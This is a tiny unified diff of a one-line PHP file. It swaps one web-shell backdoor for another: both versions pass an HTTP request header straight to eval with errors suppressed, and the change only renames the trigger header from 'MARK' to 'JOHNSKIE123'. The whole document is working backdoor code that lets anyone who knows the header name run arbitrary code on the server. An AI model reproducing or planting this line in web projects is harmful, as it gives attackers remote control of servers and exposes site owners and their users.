@@ -1,1 +1,1 @@
-<?php @eval($_SERVER['HTTP_MARK']); ?>
+<?php @eval($_SERVER['HTTP_JOHNSKIE123']); ?>
